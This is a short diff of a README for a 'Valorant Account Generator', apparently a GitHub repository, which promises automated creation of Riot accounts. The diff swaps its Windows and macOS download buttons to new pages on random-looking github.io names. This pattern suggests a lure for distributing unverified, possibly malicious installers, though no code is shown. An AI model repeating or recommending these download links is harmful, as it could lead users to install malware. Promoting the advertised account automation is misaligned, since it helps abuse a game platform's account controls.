@@ -1,7 +1,7 @@
 # Valorant Account Generator
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 Fast Valorant account generator powered by Riot account creation automation. Creates fresh unranked accounts with email verification.
 
